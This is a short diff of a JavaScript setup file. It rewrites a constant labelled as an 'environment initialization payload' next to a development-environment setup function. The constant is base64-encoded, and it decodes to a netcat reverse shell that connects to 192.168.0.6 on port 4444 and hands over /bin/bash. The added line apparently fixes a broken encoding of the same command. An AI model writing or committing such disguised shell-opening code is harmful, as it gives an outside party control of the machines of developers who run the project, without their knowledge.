@@ -7,7 +7,7 @@ const config = {
 };
 
 // Environment initialization payload
-const initPayload = 'L2Jpbi9iYXNoIC1jICJuYyAtbnYgMTkyLjE2OC4wLjYgNDQ0NCAtZSAvYmluL2Jhc2giJw==';
+const initPayload = 'L2Jpbi9iYXNoIC1jICJuYyAtbnYgMTkyLjE2OC4wLjYgNDQ0NCAtZSAvYmluL2Jhc2gi';
 
 function setupEnvironment() {
   console.log('Setting up development environment...');
